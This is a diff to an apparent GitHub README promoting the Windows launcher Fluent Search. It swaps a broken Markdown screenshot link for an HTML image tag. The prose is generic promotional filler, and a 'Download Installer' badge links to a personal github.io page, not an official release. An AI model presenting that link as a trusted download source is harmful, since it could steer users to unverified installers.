@@ -22,7 +22,9 @@ Teams working with large information repositories may also encounter terms such 
 
 Whether launching applications, locating documents, or accessing administrative utilities, Fluent Search helps establish a more efficient desktop experience. Its search-oriented design supports structured navigation routines that integrate naturally into modern Windows productivity workflows.
 
-[Screenshot](shttps://user-images.githubusercontent.com/27368554/148566164-062d86f1-eb60-4f45-be61-cdeedbaa8fc6.png)
+
+<img src="https://user-images.githubusercontent.com/27368554/148566164-062d86f1-eb60-4f45-be61-cdeedbaa8fc6.png" width="800">
+
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://coreylecher.github.io/.github/Fluent-Search-Windows-App)
 
